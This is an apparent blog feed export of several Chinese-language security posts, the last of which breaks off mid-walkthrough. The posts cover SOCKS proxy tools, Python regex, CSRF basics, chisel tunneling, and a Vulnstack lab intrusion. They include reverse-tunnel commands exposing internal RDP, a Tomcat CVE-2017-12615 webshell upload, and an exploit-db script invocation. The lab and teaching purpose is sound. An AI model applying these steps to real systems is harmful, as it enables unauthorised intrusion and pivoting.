    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型： SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP、UDP协议，还支持各种身份验证机制等，其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可以理解为加强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时尽可能选择没有GUI界面的。尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的更好。</p><p>常见的内网渗透测试环境：<br>Internet –&gt; 防火墙 –&gt; 边界 –&gt; 防火墙 –&gt; 受限区域</p><h2 id="0x01-代理工具"><a href="#0x01-代理工具" class="headerlink" title="0x01 代理工具"></a>0x01 代理工具</h2><ol><li>EarthWorm</li><li>reGeorg</li><li>sSocks</li><li>SocksCap64</li><li>Proxifier</li><li>ProxyChains</li><li>chisel</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、F</summary>
      
    
    
    
    <category term="内网" scheme="http://lvpsectime.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="代理" scheme="http://lvpsectime.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="http://lvpsectime.github.io/post/26030.html"/>
    <id>http://lvpsectime.github.io/post/26030.html</id>
    <published>2020-10-20T07:31:02.000Z</published>
    <updated>2020-10-20T09:21:38.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字<br><code>&#39;00\d&#39;</code>可以匹配<code>&#39;002&#39;</code>、<code>&#39;003&#39;</code>等，但是无法匹配<code>&#39;00a&#39;</code><br><code>&#39;\d\d\d&#39;</code>可以匹配长度为3的字符串或数字，比如<code>&#39;123&#39;</code>、<code>&#39;111&#39;</code>等<br><code>&#39;\w\w\d&#39;</code>可以匹配长度为3的字符串，比如<code>&#39;aa1&#39;</code>、<code>&#39;ds0&#39;</code>等<br><code>.</code>可以匹配任意一个字符，比如<code>&#39;ab.&#39;</code>可以匹配<code>&#39;ab1&#39;</code>、<code>&#39;abd&#39;</code>等</p><p>要匹配变长的字符，<br>用<code>*</code>表示任意个字符，包括0个，<br>用<code>+</code>表示至少一个字符，<br>用<code>?</code>表示0个或1个字符，<br>用<code>&#123;n&#125;</code>表示n个字符，<br>用<code>&#123;n,m&#125;</code>表示n-m个字符</p><p>例如，<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code></p><ul><li><code>\d&#123;3&#125;</code>代表3个数字</li><li><code>\s</code>代表匹配一个空格（包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格</li><li><code>\d&#123;3,8&#125;</code>表示3到8个数字</li></ul><p>综上，上面的正则表达式可以匹配前面3个数字，中间至少一个空格，后面3到8个数字的字符串</p><p>如果要匹配特殊字符，比如<code>-</code>，需要用<code>\</code>转义，即<code>\-</code></p><h2 id="0x01-进阶"><a href="#0x01-进阶" class="headerlink" title="0x01 进阶"></a>0x01 进阶</h2><p>要做到更精确的匹配，可以用<code>[]</code>表示范围</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、或一个字母或者一个下划线</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0,19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面一个字符+后面最多19个字符）</li></ul><p><code>A|B</code>可以匹配A或B<br><code>(P|p)ython</code>可以匹配<code>Python</code>或<code>python</code><br><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头<br><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结尾</p><h2 id="0x02-re模块"><a href="#0x02-re模块" class="headerlink" title="0x02 re模块"></a>0x02 re模块</h2><p>下面用Python的re库使用正则表达式<br>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;abc\\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc\-111</span><br></pre></td></tr></table></figure><p>所以我们可以使用<code>r</code>前缀，原始字符串，不用考虑转义的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = r&#x27;abc\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc-111</span><br></pre></td></tr></table></figure><p>判断正则表达式是否匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010-12345&#x27;)</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010 12345&#x27;)</span><br></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = &#x27;用户输入的字符串&#x27;</span><br><span class="line">if re.match(r&#x27;正则表达式&#x27;, test):</span><br><span class="line">    print(&#x27;ok&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;failed&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x03-切分字符串"><a href="#0x03-切分字符串" class="headerlink" title="0x03 切分字符串"></a>0x03 切分字符串</h2><p>用正则表达式切片更加灵活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;a b     c&#x27;.split(&#x27; &#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>无法识别连续的空格，用正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a b     c&#x27;</span><br><span class="line">res = re.split(r&#x27;\s+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>切分空格、,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c,d  e&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span><br></pre></td></tr></table></figure><p>再加上<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c;;d  e;test&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,\;]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;test&#x27;]</span><br></pre></td></tr></table></figure><h2 id="0x04-分组"><a href="#0x04-分组" class="headerlink" title="0x04 分组"></a>0x04 分组</h2><p>提取子串<br>用<code>()</code>表示的就是要提取的分组(Group)。<br><code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出两个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;010-5832360&#x27;</span><br><span class="line">if re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str):</span><br><span class="line">    print(&quot;匹配成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;匹配失败&quot;)</span><br><span class="line">res = re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str)</span><br><span class="line">print(res.group(0))</span><br><span class="line">print(res.group(1))</span><br><span class="line">print(res.group(2))</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">匹配成功</span><br><span class="line">010-5832360</span><br><span class="line">010</span><br><span class="line">5832360</span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来。</p><p>注意到group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串。</p><h2 id="0x05-贪婪匹配"><a href="#0x05-贪婪匹配" class="headerlink" title="0x05 贪婪匹配"></a>0x05 贪婪匹配</h2><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;102300&#x27;, &#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的0全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+?)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;1023&#x27;, &#x27;00&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x06-写在最后"><a href="#0x06-写在最后" class="headerlink" title="0x06 写在最后"></a>0x06 写在最后</h2><p>正则表达式的内容绝不止这些，这些只是基本的用法。<br>后面会接着学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础&quot;&gt;&lt;/a&gt;0x00 基础&lt;/h2&gt;&lt;p&gt;正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则</summary>
      
    
    
    
    <category term="Python" scheme="http://lvpsectime.github.io/categories/Python/"/>
    
    
    <category term="python" scheme="http://lvpsectime.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CSRF从0到1</title>
    <link href="http://lvpsectime.github.io/post/65258.html"/>
    <id>http://lvpsectime.github.io/post/65258.html</id>
    <published>2020-05-22T07:07:47.000Z</published>
    <updated>2020-07-09T00:03:03.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。与 XSS 不同的是，XSS利用站点内的信任用户，而CSRF通过伪装成受信任用户请求受信任的网站，也就是攻击者盗用你的身份，以你的名义发送恶意请求。</p><p>CSRF能够做的事情包括以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账等。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>举个例子</strong></p><p>你想给某用户转账100元，单击“转账”按钮之后，发出的HTTP请求会与<code>http://www.xxbank.com/pay.php?user=xx&amp;money=100</code>类似。攻击者构造链接<code>http://www.xxbank.com/pay.php?user=hacker&amp;money=100</code>，当目标用户访问了该URL后，就会自动向hacker账号转账100元，而且这只涉及目标用户的操作，攻击者并没有获取目标用户的cookie或其他信息。</p><p>CSRF攻击过程有两个重点：</p><ul><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>chisel使用</title>
    <link href="http://lvpsectime.github.io/post/13593.html"/>
    <id>http://lvpsectime.github.io/post/13593.html</id>
    <published>2020-05-17T03:39:38.000Z</published>
    <updated>2020-05-17T09:23:07.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。</p><p>项目地址：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p><strong>Chisel 是一款Go语言编写开源的通信加密的用于绕过防火墙使用 HTTP? 协议进行传输的快速 TCP 隧道工具</strong></p><p>特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 使用方便</span><br><span class="line">- 高性能</span><br><span class="line">- 使用SSH协议的加密连接（通过crypto/ssh）</span><br><span class="line">- 支持身份验证</span><br><span class="line">- 客户端自动重新连接</span><br><span class="line">- 客户端可以通过一个 TCP 连接创建多个隧道</span><br><span class="line">- 客户端可以创建 HTTP CONNECT 代理</span><br><span class="line">- 服务端可选择兼作反向代理</span><br><span class="line">- 服务端可选择创建 SOCKS5 代理</span><br><span class="line">- 支持反向端口转发</span><br></pre></td></tr></table></figure><p>关键是<code>Chisel</code>的服务器端和客户端集成在一块，这就很方便了，不想<code>frp</code>还需要配置。</p><p>但是，<code>Chisel</code>的缺点就是，它的文件比较大。</p><h2 id="使用-Chisel-反弹-Socks5-代理"><a href="#使用-Chisel-反弹-Socks5-代理" class="headerlink" title="使用 Chisel 反弹 Socks5 代理"></a>使用 Chisel 反弹 Socks5 代理</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 5555 --socks5  # 在本地 5555 端口启动 Socks5 服务</span><br></pre></td></tr></table></figure><p><strong>本地执行 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client IP:5555 socks</span><br></pre></td></tr></table></figure><h2 id="Chisel-进行端口映射"><a href="#Chisel-进行端口映射" class="headerlink" title="Chisel 进行端口映射"></a>Chisel 进行端口映射</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 1337 --reverse</span><br></pre></td></tr></table></figure><p><strong>内网主机上启动 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chisel client WANIP:1337 R:1234:LANIP:3389</span><br><span class="line">WANIP 是公网主机的公网 IP，LANIP 是内网主机的内网 IP</span><br></pre></td></tr></table></figure><p>如果 <code>server1</code> 上启动 <code>Chisel</code> 的 <code>client</code> 模式，且 <code>LANIP</code> 为 <code>server1</code> 的 <code>IP</code> 时，<code>server1</code> 的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code> 端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-143105.jpg" alt="img"></p><p>如果 <code>server1</code> 上运行 <code>Chisel</code> 的 <code>client</code> 模式，但 <code>LANIP</code> 为 <code>server2</code> 的 <code>IP</code> 时，通过 <code>server1</code> 把<code>server2 </code>的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code>端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-151947.jpg" alt="img"></p><p>从第二种用法可以看出 Chisel 的端口转发功能比 lcx 更强大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html">Tunneling with Chisel and SSF</a></p><p><a href="https://runsisi.com/2019-09-21/chisel-proxy">https://runsisi.com/2019-09-21/chisel-proxy</a></p><p><a href="https://runsisi.com/2019-09-20/chisel-reverse-proxy">https://runsisi.com/2019-09-20/chisel-reverse-proxy</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github</summary>
      
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列四</title>
    <link href="http://lvpsectime.github.io/post/50306.html"/>
    <id>http://lvpsectime.github.io/post/50306.html</id>
    <published>2020-05-16T08:17:49.000Z</published>
    <updated>2020-05-16T08:31:43.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;CK实战系列——红队评估（四）靶场环境，下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>网络拓扑如下：</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-2.png" alt="ATT-CK-2.png"></p><p>IP如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali linux  192.168.150.141</span><br><span class="line">web(ubuntu) 192.168.150.160(外) 192.168.183.128(内)</span><br><span class="line">win7        192.168.183.129</span><br><span class="line">DC(win2008) 192.168.183.130</span><br></pre></td></tr></table></figure><p>进入<code>WEB</code>主机，需要手动使用<code>docker</code>开启服务，分别是<code>strtus2-045</code>、<code>cve-2017-12615</code>、<code>cve-2018-12613</code><br>使用<code>docker</code>需要使用<code>sudo</code>否则没有权限使用，开启后情况如下</p><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><p>我们先用<code>nmap</code>扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br></pre></td></tr></table></figure><p>扫描结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/nmap# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Failed to open normal output file nmap/vulnstack4.nmap for writing</span><br><span class="line">QUITTING!</span><br><span class="line">root@kali:~/nmap# cd ..</span><br><span class="line">root@kali:~# nmap -sC -sV -oA nmap/vulnstack4 192.168.150.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 09:40 CST</span><br><span class="line">Nmap scan report for 192.168.150.160</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 6d:1e:e7:55:ee:d7:2b:22:d7:6b:68:67:df:39:f5:7b (DSA)</span><br><span class="line">|   2048 5e:ca:2c:70:8f:a2:0c:bf:10:d7:26:2b:15:5f:3f:58 (RSA)</span><br><span class="line">|   256 de:b5:6a:a8:24:6a:13:45:cc:87:21:c3:c2:ee:b2:10 (ECDSA)</span><br><span class="line">|_  256 8e:02:ca:99:6e:c2:eb:8f:0c:5c:bb:c9:b2:f5:06:4d (ED25519)</span><br><span class="line">2002/tcp open  http    Apache Tomcat 8.5.19</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/8.5.19</span><br><span class="line">MAC Address: 00:0C:29:57:73:39 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问<code>http://192.168.150.160:2002/</code>发现是<code>Tomcat</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/14/ATT-CK-1006440fbf2833079.png" alt="Tomcat"></p><p>利用<code>CVE-2017-12615</code>直接<code>put</code>一个冰蝎马上去</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-3.png" alt="attck4-3.png"></p><p>这里有几点需要<strong>注意</strong>的：</p><ol><li>将<code>GET</code>请求改为<code>PUT</code></li><li>上传<code>shell</code>的名称后面需要加上<code>/</code>，比如，<code>/shell.jsp/</code></li><li>在最后加上要上传的内容，即shell</li></ol><p>访问<code>http://192.168.150.160:2002/shell.jsp</code>，<code>shell</code>已经成功上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck4-4.png" alt="attck4-4.png"></p><p>使用冰蝎成功连接，是<code>root</code>权限</p><p><img src="http://www.sectime.top:8888/images/2020/05/14/attck45.png" alt="attck45.png"></p><h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>首先搜索一下<code>apache tomcat</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit apache tomcat</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                              |  Path</span><br><span class="line">                                                                                            | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuration File Arbitrary Command Execution                  | exploits/cgi/webapps/35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service               | exploits/unix/dos/22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tomcat - Denial of Service                             | exploits/multiple/dos/31615.rb</span><br><span class="line">Apache Tomcat (Windows) - &#x27;runtime.getRuntime().exec()&#x27; Local Privilege Escalation          | exploits/windows/local/7264.txt</span><br><span class="line">......</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal                                         | exploits/unix/remote/14489.c</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - &#x27;utf8&#x27; Directory Traversal (PoC)                                   | exploits/multiple/remote/6229.txt</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/windows/webapps/42953.txt</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck47.png" alt="attck47.png"></p><p>找到一个可用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote C | exploits/jsp/webapps/42966.py</span><br></pre></td></tr></table></figure><p>将payload复制到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit -m exploits/jsp/webapps/42966.py</span><br><span class="line">  Exploit: Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23 / &lt; 8.0.47 / &lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/42966</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/jsp/webapps/42966.py</span><br><span class="line">File Type: Python script, ASCII text executable, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/42966.py</span><br></pre></td></tr></table></figure><p>然后可以使用<code>42966.py</code>脚本</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck48.png" alt="attck48.png"></p><p>用<code>-u</code>参数检测是否存在漏洞</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck49.png" alt="attck49.png"></p><p>存在漏洞，访问<code>http://192.168.150.160:2002/Poc.jsp</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck410.png" alt="attck410.png"></p><p>我们就用自带的工具利用漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python 42966.py -u http://192.168.150.160:2002/ -p pwn</span><br></pre></td></tr></table></figure><p>!<img src="http://www.sectime.top:8888/images/2020/05/15/attck411.png" 